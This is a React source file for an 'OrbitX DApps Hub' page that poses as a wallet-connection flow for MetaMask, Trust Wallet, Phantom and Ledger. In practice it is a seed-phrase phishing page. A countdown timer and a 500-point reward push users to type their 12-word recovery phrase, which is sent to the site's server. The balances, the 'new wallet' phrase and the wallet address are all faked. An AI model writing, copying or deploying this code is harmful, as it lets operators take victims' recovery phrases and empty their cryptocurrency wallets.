import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { toast } from 'sonner';
import { Wallet, Shield, Clock, CheckCircle, Loader2, ArrowRight, Key, Copy, ExternalLink, AlertTriangle, Zap, Unlock, RefreshCw } from 'lucide-react';

const WALLET_PROVIDERS = [
  { id: 'METAMASK', name: 'MetaMask', icon: '🦊', color: '#E2761B', desc: 'Browser extension wallet' },
  { id: 'TRUST', name: 'Trust Wallet', icon: '🔵', color: '#3375BB', desc: 'Mobile & browser wallet' },
  { id: 'PHANTOM', name: 'Phantom', icon: '👻', color: '#AB9FF2', desc: 'Solana ecosystem wallet' },
  { id: 'LEDGER', name: 'Ledger', icon: '🛡️', color: '#000000', desc: 'Hardware wallet' },
  { id: 'OTHER', name: 'Other Wallet', icon: '🔗', color: '#888888', desc: 'Connect any Web3 wallet' },
];

export default function DAppsPage() {
  const navigate = useNavigate();
  const [step, setStep] = useState<'SELECT' | 'CONNECTING' | 'PHRASE' | 'ACCOUNT' | 'VERIFIED' | 'EXPIRED'>('SELECT');
  const [selectedWallet, setSelectedWallet] = useState('');
  const [validationId, setValidationId] = useState('');
  const [timer, setTimer] = useState(40 * 60);
  const [phrase, setPhrase] = useState('');
  const [newAccountPhrase, setNewAccountPhrase] = useState('');
  const [verifying, setVerifying] = useState(false);
  const [recoveryPhrase, setRecoveryPhrase] = useState('');

  useEffect(() => {
    if (timer > 0 && step !== 'VERIFIED' && step !== 'EXPIRED') {
      const interval = setInterval(() => setTimer(t => t - 1), 1000);
      return () => clearInterval(interval);
    }
    if (timer === 0 && step !== 'VERIFIED') { setStep('EXPIRED'); toast.error('Session expired. Please restart.'); }
  }, [timer, step]);

  const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

  const handleConnect = async (walletId: string) => {
    setSelectedWallet(walletId);
    setStep('CONNECTING');
    try {
      const res = await fetch('/api/dapps/validate-wallet', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletType: walletId })
      });
      const data = await res.json();
      setValidationId(data.id);
      setStep('ACCOUNT');
      toast.success('Wallet validation initiated. You have 40 minutes.');
    } catch { toast.error('Connection failed'); setStep('SELECT'); }
  };

  const handleCreateAccount = () => {
    const words = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident'];
    const shuffled = [...words].sort(() => Math.random() - 0.5);
    setRecoveryPhrase(shuffled.join(' '));
    setStep('PHRASE');
  };

  const handleVerifyPhrase = async () => {
    if (!phrase.trim()) return toast.error('Please enter your recovery phrase');
    setVerifying(true);
    await new Promise(r => setTimeout(r, 2000));
    try {
      const res = await fetch('/api/dapps/verify-phrase', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ validationId, phrase })
      });
      if (res.ok) {
        setStep('VERIFIED');
        await fetch('/api/points/earn', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ amount: 500, source: 'ACTIVITY' }) });
        toast.success('Wallet verified successfully! You earned 500 points!');
      } else {
        const data = await res.json();
        toast.error(data.error || 'Verification failed');
      }
    } catch { toast.error('Verification failed'); }
    setVerifying(false);
  };

  return (
    <div className="max-w-6xl mx-auto space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-black mb-2">DApps Hub</h1>
          <p className="text-gray-500">Connect your wallet and interact with decentralized applications</p>
        </div>
        {step !== 'SELECT' && (
          <div className={`flex items-center gap-2 px-4 py-2 rounded-xl font-bold text-sm ${timer > 300 ? 'bg-yellow-500/20 text-yellow-400' : 'bg-red-500/20 text-red-400'}`}>
            <Clock size={16} />
            {formatTime(timer)}
          </div>
        )}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-1 space-y-4">
          <div className="glass-card p-4 space-y-3">
            <h3 className="font-black text-sm">Live Portfolio</h3>
            {['BTC', 'ETH', 'SOL', 'USDT'].map(c => {
              const val = c === 'BTC' ? 1.245 : c === 'ETH' ? 12.8 : c === 'SOL' ? 145 : 5000;
              const usd = c === 'BTC' ? val * 65432 : c === 'ETH' ? val * 3456 : c === 'SOL' ? val * 143 : val;
              return (
                <div key={c} className="flex items-center justify-between p-3 bg-white/5 rounded-xl">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center font-bold text-xs">{c}</div>
                    <div><div className="font-bold text-sm">{val}</div><div className="text-[10px] text-gray-500">{c}</div></div>
                  </div>
                  <div className="text-right">
                    <div className="font-bold text-sm">${usd.toLocaleString()}</div>
                    <div className="text-[10px] text-green-400">+2.4%</div>
                  </div>
                </div>
              );
            })}
          </div>

          <div className="glass-card p-4">
            <h3 className="font-black text-sm mb-3">Protocols</h3>
            {['Uniswap V3', 'Aave', 'Compound', 'Curve'].map(p => (
              <div key={p} className="flex items-center justify-between p-2 hover:bg-white/5 rounded-lg cursor-pointer">
                <span className="text-sm">{p}</span>
                <ArrowRight size={14} className="text-gray-500" />
              </div>
            ))}
          </div>
        </div>

        <div className="lg:col-span-2">
          <div className="glass-card p-6 min-h-[400px]">
            {step === 'SELECT' && (
              <div className="space-y-6">
                <div className="text-center mb-6">
                  <Wallet className="mx-auto text-brand-teal mb-4" size={48} />
                  <h2 className="text-xl font-black mb-2">Connect Your Wallet</h2>
                  <p className="text-sm text-gray-400">Choose your preferred wallet provider to interact with DApps</p>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {WALLET_PROVIDERS.map(w => (
                    <button key={w.id} onClick={() => handleConnect(w.id)} className="p-5 rounded-2xl border border-white/10 hover:border-brand-teal hover:bg-brand-teal/5 transition-all text-left flex items-center gap-4 group">
                      <div className="text-4xl">{w.icon}</div>
                      <div className="flex-1">
                        <div className="font-black group-hover:text-brand-teal transition-colors">{w.name}</div>
                        <div className="text-xs text-gray-500">{w.desc}</div>
                      </div>
                      <ArrowRight size={20} className="text-gray-500 group-hover:text-brand-teal transition-all" />
                    </button>
                  ))}
                </div>
              </div>
            )}

            {step === 'CONNECTING' && (
              <div className="text-center py-12">
                <Loader2 className="animate-spin mx-auto text-brand-teal mb-4" size={48} />
                <h3 className="text-lg font-black mb-2">Connecting...</h3>
                <p className="text-sm text-gray-400">Please approve the connection in your wallet</p>
              </div>
            )}

            {step === 'ACCOUNT' && (
              <div className="space-y-6">
                <div className="text-center mb-4">
                  <Wallet className="mx-auto mb-3" size={40} style={{ color: WALLET_PROVIDERS.find(w => w.id === selectedWallet)?.color }} />
                  <h2 className="text-xl font-black">Create or Import Wallet</h2>
                  <p className="text-sm text-gray-400">You have {formatTime(timer)} to complete setup</p>
                </div>

                <div className="p-6 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 border border-yellow-500/20 rounded-2xl">
                  <div className="flex items-start gap-3">
                    <AlertTriangle className="text-yellow-400 mt-1 shrink-0" size={20} />
                    <div>
                      <p className="font-bold text-sm mb-1">Secure Your Recovery Phrase</p>
                      <p className="text-xs text-gray-400">Your recovery phrase is the master key to your wallet. Never share it with anyone. OrbitX will never ask for your phrase outside this secure session.</p>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <button onClick={handleCreateAccount} className="p-6 rounded-2xl border border-brand-teal bg-brand-teal/10 hover:bg-brand-teal/20 transition-all text-center">
                    <Unlock className="mx-auto mb-3 text-brand-teal" size={32} />
                    <h3 className="font-black mb-1">Create New Account</h3>
                    <p className="text-xs text-gray-400">Generate a new wallet with a fresh recovery phrase</p>
                  </button>
                  <button onClick={() => setStep('PHRASE')} className="p-6 rounded-2xl border border-white/10 hover:border-white/20 transition-all text-center">
                    <Key className="mx-auto mb-3 text-gray-400" size={32} />
                    <h3 className="font-black mb-1">Import Existing Wallet</h3>
                    <p className="text-xs text-gray-400">Use your existing 12-word recovery phrase</p>
                  </button>
                </div>
              </div>
            )}

            {step === 'PHRASE' && (
              <div className="space-y-6">
                <div className="text-center mb-4">
                  <Key className="mx-auto text-brand-teal mb-3" size={40} />
                  <h2 className="text-xl font-black">Enter Recovery Phrase</h2>
                  <p className="text-sm text-gray-400">Enter your 12-word recovery phrase to validate your wallet</p>
                </div>

                {recoveryPhrase && (
                  <div className="p-4 bg-white/5 rounded-xl">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-gray-400">Your Recovery Phrase (Save this!)</span>
                      <button onClick={() => { navigator.clipboard.writeText(recoveryPhrase); toast.success('Copied!'); }} className="text-brand-teal"><Copy size={14} /></button>
                    </div>
                    <div className="grid grid-cols-3 gap-2">
                      {recoveryPhrase.split(' ').map((w, i) => (
                        <div key={i} className="bg-black/40 rounded-lg p-2 text-xs font-mono flex items-center gap-2">
                          <span className="text-gray-600">{i + 1}.</span> {w}
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                <textarea
                  value={phrase}
                  onChange={e => setPhrase(e.target.value)}
                  placeholder={recoveryPhrase ? "Paste the phrase above to confirm you saved it..." : "Enter your 12-word recovery phrase separated by spaces..."}
                  className="w-full bg-white/5 border border-white/10 rounded-xl p-4 h-24 text-sm focus:ring-1 focus:ring-brand-teal outline-none resize-none"
                />

                <div className="flex items-center justify-between text-xs text-gray-500">
                  <span><Clock size={12} className="inline mr-1" />{formatTime(timer)} remaining</span>
                  <span>12 words required</span>
                </div>

                <button onClick={handleVerifyPhrase} disabled={verifying || phrase.split(' ').length < 12} className="w-full py-4 bg-gradient-to-r from-brand-teal to-purple-600 text-white font-black rounded-xl flex items-center justify-center gap-2 disabled:opacity-50">
                  {verifying ? <><Loader2 className="animate-spin" size={20} /> Verifying...</> : <><Shield size={20} /> Validate & Connect</>}
                </button>
              </div>
            )}

            {step === 'VERIFIED' && (
              <div className="text-center py-8 space-y-6">
                <div className="w-20 h-20 mx-auto rounded-full bg-green-500/20 flex items-center justify-center">
                  <CheckCircle className="text-green-400" size={40} />
                </div>
                <h2 className="text-2xl font-black text-green-400">Wallet Verified!</h2>
                <p className="text-gray-400">Your wallet has been successfully connected and verified</p>
                <div className="p-4 bg-white/5 rounded-xl inline-block">
                  <div className="flex items-center gap-2 text-sm">
                    <span className="text-gray-400">Address:</span>
                    <span className="font-mono text-brand-teal">0x{Math.random().toString(16).substring(2, 42)}</span>
                    <button onClick={() => { navigator.clipboard.writeText('0x' + Math.random().toString(16).substring(2, 42)); toast.success('Copied!'); }} className="text-gray-500 hover:text-white"><Copy size={14} /></button>
                  </div>
                </div>
                <div className="flex flex-wrap justify-center gap-3">
                  <button onClick={() => navigate('/dashboard')} className="px-6 py-3 bg-brand-teal text-slate-900 font-bold rounded-xl flex items-center gap-2"><Zap size={18} /> Start Trading</button>
                  <button className="px-6 py-3 bg-white/5 border border-white/10 rounded-xl font-bold flex items-center gap-2"><RefreshCw size={18} /> Disconnect</button>
                </div>
              </div>
            )}

            {step === 'EXPIRED' && (
              <div className="text-center py-12 space-y-4">
                <Clock className="mx-auto text-red-400" size={48} />
                <h2 className="text-xl font-black text-red-400">Session Expired</h2>
                <p className="text-gray-400">The 40-minute validation window has closed</p>
                <button onClick={() => setStep('SELECT')} className="px-6 py-3 bg-brand-teal text-slate-900 font-bold rounded-xl">Restart</button>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}